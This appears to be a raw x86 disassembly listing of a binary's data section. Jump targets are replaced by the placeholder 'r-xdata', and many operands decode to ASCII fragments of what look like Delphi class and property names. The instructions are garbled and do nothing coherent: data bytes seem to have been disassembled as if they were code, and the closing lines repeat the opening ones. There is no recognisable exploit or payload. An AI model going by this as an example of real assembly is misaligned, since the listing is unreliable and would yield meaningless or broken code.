arpl [ eax + eax + 0xc ] si
adc [ eax ] eax
dec eax
and eax 0x2f940043
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or al 0x11
inc eax
add al ah
adc al 0x41
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x2ddc0040 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] cl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xc007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x2e640040 ] cl
inc ebx
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
or al 0x11
inc eax
add al ch
daa
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x30580040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
or al 0x11
inc eax
add [ ecx + edx ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add al dh
das
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
or al 0x11
inc eax
add [ ecx + edx ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x2f4c0040 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] cl
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x432d78c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
or al 0x11
inc eax
add [ edx + ebp ] ch
inc ebx
add al ah
adc al 0x41
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al ch
daa
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x432a ] ch
adc [ eax ] al
nop
call 0x8437419
or al 0x54
or al 0x11
outsb
je r-xdata
jbe r-xdata
inc ebp
inc ebx
jpe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sub al 0x32
inc ebx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
inc eax
aaa
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xc ] si
adc [ eax ] eax
call 0xffffffffa04374c4
xor [ ebx ] eax
or [ ecx ] dl
push esp
inc edi
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4333b4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax + 0x37 ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] cl
inc eax
add [ eax + 0x37 ] al
inc ebx
add ah bh
inc ebx
add [ eax ] al
adc [ eax ] al
push esp
xor [ ebx ] eax
or [ edi ] cl
push esp
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
mov ah 0x33
inc ebx
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
sub al 0x33
inc ebx
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x35 ] dh
inc ebx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43332cc0 ] cl
or al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ebx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + ebp * 2 - 0x78b7ffbd ] ch
inc ebx
add [ edi + eax * 4 + 0x43 ] al
add [ eax + ecx * 4 ] dl
inc ebx
add al dh
push 0x43
add [ edx + esi * 2 ] dh
inc ebx
add [ eax - 0x3fffbc8f ] bl
jpe r-xdata
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add al bl
mov eax [ ebx ]
sub al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] al
or [ edx ] ch
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push es
add [ eax + 0x78 ] al
inc ebx
add [ edx + ecx * 4 + 0x43 ] al
add al al
0x7c800043 0x43
hlt
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x1540040 ] ch
add [ eax ] al
dec ebx
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
jo r-xdata
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add al ah
adc al 0x41
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
pushfd
xor al [ ebx ]
or [ edi ] dl
lea eax [ eax ]
int3
jbe r-xdata
add [ esi ] dh
aaa
inc ebx
add [ ecx + eax ] bl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] cl
inc eax
add al ah
adc al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
sub [ ebx + eax * 2 ] dh
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ecx + ebp * 2 - 0x6747ffbd ] al
inc ebx
add [ eax + 0x6c00438c ] dh
inc edi
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add al ch
imul eax [ ebx ] 0xffffff94
jne r-xdata
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_432987
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0xfffbe4f ] ah
inc ebx
add ah dl
mov cl 0x41
add [ eax ] dl
inc ebx
add [ eax ] cl
mov dl 0x41
add [ edi - 0x4ea7ffbd ] bh
inc ecx
add ah ch
mov cl 0x41
add [ eax - 0x4e ] al
inc ecx
add ah bh
inc ebx
add ah ah
cmp [ eax + eax + 0x70 ] al
inc bx
add [ ecx + edi ] cl
inc esp
add [ eax ] ah
cmp [ eax + eax - 0x18 ] eax
inc ebx
add [ esi + 0x395c0043 ] ah
inc esp
add [ eax + 0x39 ] dh
inc esp
add ah bl
inc bx
add [ eax + 0x38004439 ] bl
inc ebx
add [ eax + 0x58004439 ] ah
inc ebx
add [ eax + 0x6c004439 ] ch
push 0x684c0043
inc ebx
add [ eax + ebp * 2 + 0x67780043 ] cl
inc ebx
add [ ecx + edi + 0x39c00044 ] bh
inc esp
add [ edi + 0x650c0043 ] bl
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x432a3090
add [ ebx ] al
or al 0x54
add ah dh
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
inc eax
add [ ebx + ebp + 0x8060043 ] bl
push esp
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
inc ebx
add [ eax + 0x2b ] edx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb00432a ] ch
jae r-xdata
sub al 0x2b
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + ebp ] ch
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
push eax
inc ebx
inc ebx
outsd
outsb
jae r-xdata
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
sub al [ ebx ]
push es
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
shr [ edx + ebp + 0xa030043 ] 0x54
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
popad
js r-xdata
jb r-xdata
add [ eax + 0x48 ] bl
inc ecx
add [ edi + eax * 2 + 0x41 ] ch
add ah bl
inc ebx
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add ah dl
xor al 0x40
add al bl
xor al 0x40
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
add [ eax ] al
or [ ebp + 0x61 ] ecx
sub eax [ ebx ]
adc al 0x0
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x74 ] r-xdata
inc esp
sub al 0x43
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
jb r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add [ eax ] cl
fdiv [ eax + eax * 2 ]
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
sub al [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
add bh bh
push eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
add [ 0xb080043 ] ch
push esp
dec ebp
outsd
imul esp [ edi + 0x68 ] 0x432bac74
imul esp [ gs : edi + 0x68 ] 0x432bac74
add [ eax + eax ] cl
add bh bh
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x2b54c08b
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
dec esp
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
adc [ eax ] al
add bh bh
push eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
lodsb [ esi ]
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x432bac74
jb r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add ah cl
arpl [ ebx ] ax
inc ebx
add eax 0x0
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
outsb
jae r-xdata
imul ebp [ esi + 0x64 ] 0x1
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
push esp
sub eax [ ebx ]
add ecx [ ebx ]
push esp
inc ecx
outsb
or [ ebx + 0x6f ] al
outsb
je r-xdata
lea eax [ eax ]
clc
insb
add [ ecx + edx ] cl
inc eax
add [ eax - 0x1fffbff0 ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
sub eax [ ebx ]
imul ebp [ esi + 0x74 ] 0x432c1873
add [ esp + ebx + 0x41 ] ch
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ ebx ] al
add [ eax ] al
add [ eax + 0x2b ] dl
inc ebx
add [ esi ] al
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
outsb
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] cl
inc eax
add [ ecx + edx ] cl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc ebx
outsd
insb
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx + ebp + 0x43 ] ch
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
sub al [ ebx ]
add ecx [ ecx ]
push esp
inc esp
jb r-xdata
inc eax
add al bh
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + 0x432a ] ch
or al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
js r-xdata
add [ eax ] cl
add [ eax ] al
call [ eax + 0x64 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
add [ ebx + ebp + 0x80043 ] ch
add bh bh
push eax
inc ebx
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
push ebx
adc al 0x41
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add al ah
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
dec esp
das
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
adc [ eax ] al
nop
in al dx
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
test al 0x2a
inc ebx
add [ eax ] al
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or al 0x11
inc eax
add [ eax + 0x25 ] cl
inc ebx
add [ edi + ebp + 0xd080043 ] dl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xc ] si
adc [ eax ] eax
dec eax
and eax 0x2f940043
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or al 0x11
inc eax
add al ah
adc al 0x41
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x2ddc0040 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] cl
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xc007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0x2e640040 ] cl
inc ebx
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
or al 0x11
inc eax
add al ch
daa
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0x30580040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
or al 0x11
inc eax
add [ ecx + edx ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add al dh
das
inc ebx
add [ eax ] cl
push cs
push esp
